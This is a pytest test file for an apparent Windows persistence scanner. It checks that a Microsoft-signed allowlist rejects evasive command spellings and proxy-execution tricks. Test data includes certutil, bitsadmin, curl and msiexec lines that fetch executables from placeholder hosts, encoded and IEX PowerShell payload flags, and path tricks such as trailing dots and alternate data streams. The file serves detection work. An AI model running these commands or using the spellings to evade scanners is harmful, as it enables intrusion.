"""The Microsoft-signed floor judges the program Windows runs -- the file the
signature probe verified -- however a task or service command spells it, and
fails closed: a spelling it cannot account for gets no floor.

Every case is run as a scheduled task (task_to_run) and as a service (the whole
PathName in path), Microsoft-signed and verified, with no other signal.
"""
from __future__ import annotations
import pytest

from spyscan.allowlist import Allowlist
from spyscan.collectors.base import is_tempish
from spyscan.facts import Fact
from spyscan.pipeline import build_findings
from spyscan.rules.ioc import IOCMatcher

FLOORED = (True, "allowlisted: Microsoft-signed")
MS = {"signed": True, "verified": True, "trusted_ms": True,
      "signer": "CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US"}
SYS = "C:\\Windows\\System32"
PS = SYS + "\\WindowsPowerShell\\v1.0\\powershell.exe"
PAYLOAD = "C:\\ProgramData\\x.bat"

# a stock Windows environment, so variables expand the same on every machine
_ENV = {
    "SystemRoot": "C:\\Windows", "windir": "C:\\Windows", "SystemDrive": "C:",
    "ComSpec": SYS + "\\cmd.exe",
    "ProgramFiles": "C:\\Program Files", "ProgramW6432": "C:\\Program Files",
    "ProgramFiles(x86)": "C:\\Program Files (x86)",
    "CommonProgramFiles": "C:\\Program Files\\Common Files",
    "ProgramData": "C:\\ProgramData",
    "TEMP": "C:\\Users\\v\\AppData\\Local\\Temp", "TMP": "C:\\Users\\v\\AppData\\Local\\Temp",
    "APPDATA": "C:\\Users\\v\\AppData\\Roaming", "LOCALAPPDATA": "C:\\Users\\v\\AppData\\Local",
}


@pytest.fixture(autouse=True)
def _windows_env(monkeypatch):
    for key, value in _ENV.items():
        monkeypatch.setenv(key, value)


def _task(run, **extra):
    return {"name": "\\Evil", "task_to_run": run, "from_temp": False,
            "trusted_ms": True, "verified": True, "signer": "Microsoft Windows", **extra}


def _service(path, **extra):
    return {"name": "Evil", "path": path, "from_temp": False,
            "trusted_ms": True, "verified": True, "signer": "Microsoft Windows", **extra}


RECORDS = [pytest.param(_task, id="task"), pytest.param(_service, id="service")]

# --- spellings that must lose the floor -------------------------------------------

NOT_FLOORED = [
    # the host named through a variable (tasks keep raw variables)
    pytest.param("%ComSpec% /c " + PAYLOAD, id="comspec-variable"),
    pytest.param('"%ComSpec%" /c ' + PAYLOAD, id="comspec-variable-quoted"),
    # no blank after the closing quote
    pytest.param('"' + SYS + '\\cmd.exe"/c ' + PAYLOAD, id="cmd-quoted-no-blank"),
    pytest.param('"' + PS + '"-enc SQBFAFgA', id="powershell-quoted-no-blank"),
    # spellings Win32 opens as cmd.exe
    pytest.param(SYS + "\\cmd.exe. /c " + PAYLOAD, id="trailing-dot"),
    pytest.param('"' + SYS + '\\cmd.exe." /c ' + PAYLOAD, id="trailing-dot-quoted"),
    pytest.param('"' + SYS + '\\cmd.exe. . " /c ' + PAYLOAD, id="trailing-dots-spaces-quoted"),
    pytest.param('"' + SYS + '\\cmd.exe::$DATA" /c ' + PAYLOAD, id="data-stream"),
    pytest.param('"C:/Windows/System32/CMD.EXE" /c ' + PAYLOAD, id="forward-slashes"),
    pytest.param('"\\\\?\\' + SYS + '\\cmd.exe" /c ' + PAYLOAD, id="nt-prefix"),
    # the signed file is not the file that runs
    pytest.param("C:\\ProgramData\\evil.cmd \\..\\..\\Windows\\System32\\sc.exe",
                 id="dotdot-unquoted"),
    pytest.param('"C:\\ProgramData\\x\\..\\..\\Windows\\System32\\sc.exe"', id="dotdot-quoted"),
    pytest.param("C:\\ProgramData\\My App\\tool.exe", id="unquoted-space-plantable-prefix"),
    pytest.param("C:\\Program Files\\Microsoft Thing\\helper.dll", id="unquoted-space-no-exe"),
    pytest.param('"' + SYS + '\\cmd.exe /c ' + PAYLOAD, id="unclosed-quote"),
    # a Microsoft binary copied out of the protected folders
    pytest.param("C:\\ProgramData\\updater.exe /c " + PAYLOAD, id="renamed-copy-outside"),
    pytest.param("C:\\ProgramData\\updater.exe", id="ms-binary-outside-no-args"),
    pytest.param("C:\\Windows\\Temp\\svc.exe", id="ms-binary-in-windows-temp"),
    pytest.param("C:\\Windows \\System32\\sc.exe", id="mock-windows-folder"),
    # proxy hosts handed something to run
    pytest.param("conhost.exe --headless powershell -enc SQBFAFgA", id="conhost-headless"),
    pytest.param('forfiles.exe /p C:\\Windows /m notepad.exe /c "powershell -enc SQBFAFgA"',
                 id="forfiles"),
    pytest.param("msiexec.exe /q /i https://example.invalid/x.msi", id="msiexec-remote"),
    pytest.param("explorer.exe C:\\ProgramData\\x.hta", id="explorer"),
    pytest.param("pcalua.exe -a C:\\ProgramData\\x.exe", id="pcalua"),
    pytest.param("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe "
                 "C:\\ProgramData\\x.proj", id="msbuild"),
    pytest.param("schtasks.exe /run /tn \\Other", id="schtasks"),
    pytest.param("certutil -urlcache -split -f http://example.invalid/x C:\\ProgramData\\x.exe",
                 id="certutil"),
    pytest.param("bitsadmin /transfer j http://example.invalid/x C:\\ProgramData\\x.exe",
                 id="bitsadmin"),
    pytest.param("curl.exe -o C:\\ProgramData\\x.exe http://example.invalid/x", id="curl"),
    pytest.param("wsl.exe -e /tmp/x", id="wsl"),
    pytest.param("odbcconf /a {REGSVR C:\\ProgramData\\x.dll}", id="odbcconf"),
    pytest.param("control.exe C:\\ProgramData\\x.cpl", id="control"),
    pytest.param("cmstp.exe /s C:\\ProgramData\\x.inf", id="cmstp"),
    pytest.param("powershell_ise.exe C:\\ProgramData\\x.ps1", id="powershell-ise"),
    pytest.param(SYS + "\\manage-bde.wsf -on C:", id="script-program-with-args"),
    # raw variables reaching into temp/AppData
    pytest.param(SYS + "\\conhost.exe %TEMP%\\p.bin", id="temp-variable-argument"),
]


@pytest.mark.parametrize("record", RECORDS)
@pytest.mark.parametrize("cmd", NOT_FLOORED)
def test_spelling_does_not_keep_the_microsoft_floor(record, cmd):
    assert Allowlist().matches(record(cmd))[0] is False


# --- ordinary Windows entries that keep it ----------------------------------------

FLOORED_CASES = [
    pytest.param(SYS + "\\sc.exe", id="plain-program"),
    pytest.param("%windir%\\system32\\defrag.exe -c -h -o -$", id="plain-program-args"),
    pytest.param('"C:\\Program Files\\Windows Defender\\MpCmdRun.exe" -IdleTask -TaskName X',
                 id="defender-idle-task"),
    pytest.param(SYS + "\\svchost.exe -k netsvcs -p", id="svchost-group"),
    pytest.param('"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.1\\MsMpEng.exe"',
                 id="defender-platform"),
    pytest.param("powershell.exe", id="bare-powershell"),
    pytest.param('"' + PS + '"', id="bare-powershell-quoted"),
    pytest.param("%ComSpec%", id="bare-comspec"),
    pytest.param(SYS + "\\cmd.exe", id="bare-cmd"),
    pytest.param("explorer.exe", id="bare-explorer"),
    pytest.param("C:\\WINDOWS\\system32\\msiexec.exe /V", id="windows-installer-service"),
    pytest.param("C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\"
                 "OfficeC2RClient.exe /frequentupdate SCHEDULEDTASK", id="unquoted-program-files"),
    pytest.param("%CommonProgramFiles%\\Microsoft Shared\\ClickToRun\\OfficeC2RClient.exe "
                 "/installupdatesdx", id="unquoted-variable-program-files"),
    pytest.param('%ProgramFiles%\\Windows Media Player\\wmpnscfg.exe" "', id="stray-quote"),
    pytest.param('"C:\\Program Files\\Microsoft Thing\\helper.dll"', id="quoted-space-path"),
]


@pytest.mark.parametrize("record", RECORDS)
@pytest.mark.parametrize("cmd", FLOORED_CASES)
def test_ordinary_microsoft_entry_keeps_the_floor(record, cmd):
    assert Allowlist().matches(record(cmd)) == FLOORED


def test_edge_logon_entry_keeps_the_floor():
    edge = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
    ok = Allowlist().matches({"image_path": edge,
                              "launch_string": '"' + edge + '" --no-startup-window --win-session-start',
                              "verified": True, "signer": "Microsoft Windows"})
    assert ok == FLOORED


# --- a renamed copy is known by the name built into the file ----------------------

@pytest.mark.parametrize("record", RECORDS)
def test_renamed_script_host_is_known_by_its_original_filename(record):
    attrs = record(SYS + "\\updater.exe /c " + PAYLOAD, original_filename="Cmd.Exe")
    assert Allowlist().matches(attrs)[0] is False
    bare = record(SYS + "\\updater.exe", original_filename="Cmd.Exe")
    assert Allowlist().matches(bare) == FLOORED


@pytest.mark.parametrize("record", RECORDS)
def test_floor_judges_the_file_the_signer_verified(record):
    # the probe resolved the command to a file outside the protected folders
    attrs = record("updater.exe", signed_image="C:\\Users\\v\\Downloads\\updater.exe")
    assert Allowlist().matches(attrs)[0] is False


def test_pipeline_reads_the_original_filename_of_the_verified_file(tmp_path):
    import os
    import shutil
    cmd = os.path.join(os.environ["SystemRoot"], "System32", "cmd.exe")
    if not os.path.isfile(cmd):
        pytest.skip("needs a Windows cmd.exe")
    copy = tmp_path / "updater.exe"
    shutil.copyfile(cmd, copy)
    task = Fact("services_tasks", "services_tasks::task::evil", "scheduled_task", "task: Evil",
                {"name": "Evil", "task_to_run": f"{copy} /c {PAYLOAD}", "from_temp": False})
    out = build_findings([], [task], IOCMatcher(), signer=lambda p: dict(MS),
                         allowlist=Allowlist(), log=lambda *a: None, first_look=True)
    a = out[0].fact.attrs
    assert a["signed_image"] == str(copy)
    assert a["original_filename"].lower() == "cmd.exe"
    assert not a.get("allowlisted")


def test_a_floor_given_before_enrichment_is_taken_back_after_it():
    from spyscan.pipeline import _apply_allowlist
    a = {"image_path": SYS + "\\updater.exe", "launch_string": "updater.exe /c " + PAYLOAD,
         "verified": True, "signer": "Microsoft Windows"}
    _apply_allowlist(a, "k", Allowlist())
    assert a.get("allowlisted") is True             # cheap pass: name says nothing
    a["original_filename"] = "Cmd.Exe"              # enrichment read the file
    _apply_allowlist(a, "k", Allowlist())
    assert "allowlisted" not in a and "allowlist_reason" not in a
    assert a["floor_refused"].startswith("Microsoft-signed program, but")


# --- an image path a collector already parsed is taken as it is -------------------

def test_parsed_image_path_with_a_space_is_not_cut():
    ok = Allowlist().matches({"image_path": "C:\\Windows\\cmd tools\\helper.dll",
                              "verified": True, "signer": "Microsoft Windows"})
    assert ok == FLOORED


# --- first look: a true reason, and the payload flags PowerShell accepts ----------

def _first_look(run):
    task = Fact("services_tasks", "services_tasks::task::t", "scheduled_task", "task: T",
                {"name": "\\Microsoft\\T", "task_to_run": run, "from_temp": is_tempish(run)})
    out = build_findings([], [task], IOCMatcher(), signer=lambda p: dict(MS),
                         allowlist=Allowlist(), log=lambda *a: None, first_look=True)
    return out[0]


def test_unfloored_microsoft_task_says_why_not_that_it_is_unproven():
    fd = _first_look(SYS + "\\rundll32.exe " + SYS + "\\shell32.dll,Control_RunDLL")
    assert fd.bucket == "INFO"
    assert fd.reasons == ["+2 Microsoft-signed program, but it is a host that its command "
                          "hands something to run (first look, no baseline)"]


@pytest.mark.parametrize("args", [
    "-e SQBFAFgA", "-en SQBFAFgA", "-enc SQBFAFgA", "-enco SQBFAFgA", "-EncodedCommand SQBFAFgA",
    "/enc SQBFAFgA", "/EncodedCommand SQBFAFgA", "\u2013enc SQBFAFgA", "-nop -w hidden -ec SQBFAFgA",
    "-c IEX(iwr x)", "-Command IEX(iwr x)", "/command IEX(iwr x)", "-co IEX(iwr x)",
    "-File %TEMP%\\x.ps1", "-File %APPDATA%\\x.ps1",
])
def test_first_look_flags_powershell_payloads(args):
    fd = _first_look("powershell.exe " + args)
    assert fd.fact.attrs.get("script_payload") is True
    assert fd.bucket in ("REVIEW", "ALERT")         # a temp path also adds +3


@pytest.mark.parametrize("run", [
    "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Windows\\System32\\x.ps1",
    SYS + "\\cmd.exe /d /c C:\\Windows\\System32\\x.cmd",
    "%windir%\\system32\\rundll32.exe %windir%\\system32\\shell32.dll,Control_RunDLL",
    "wscript.exe //B //Nologo C:\\Windows\\System32\\x.vbs",
])
def test_first_look_does_not_flag_a_host_running_windows_own_files(run):
    assert not _first_look(run).fact.attrs.get("script_payload")


@pytest.mark.parametrize("path,tempish", [
    ("%TEMP%\\x.exe", True), ("%tmp%\\x.exe", True), ("%APPDATA%\\x\\y.exe", True),
    ("%LOCALAPPDATA%\\Temp\\x.exe", True), ("%windir%\\Temp\\x.exe", True),
    ("%windir%\\System32\\x.exe", False), ("%ProgramFiles%\\x\\y.exe", False),
])
def test_is_tempish_expands_variables(path, tempish):
    assert is_tempish(path) is tempish
